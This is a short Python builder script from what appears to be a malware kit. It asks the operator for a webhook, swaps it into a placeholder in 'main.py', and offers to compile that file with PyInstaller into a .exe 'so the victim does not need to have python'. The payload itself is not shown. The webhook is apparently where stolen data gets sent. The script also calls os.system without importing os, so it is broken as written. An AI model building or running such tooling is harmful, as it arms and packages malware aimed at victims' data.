import codecs

webhook = input("What is your webhook? ")

search_text = "run builder py first"
replace_text = webhook

with codecs.open("main.py", "r", encoding="utf-8") as file:
    data = file.read()
    data = data.replace(search_text, replace_text)

with codecs.open("main.py", "w", encoding="utf-8") as file:
    file.write(data)

print(
    'Added your webhook to "main.py"! type "exec" if you want to build it to a .exe file so the victim does not need to have python or you can just keep it and type "keep" and press enter to keep the "main.py" file with your webhook.'
)
choice = input("Choice [exec/keep]: ")
if choice == "exec":
    os.system("pip install pyinstaller")
    os.system("pyinstaller --onefile main.py")
elif choice == "keep":
    print("Keeping the main.py file with your webhook attached to it.")
    input("Enter to exit.")
else:
    print('u did not type keep or exec. now it is going to be defaulted to "keep"')
    quit()
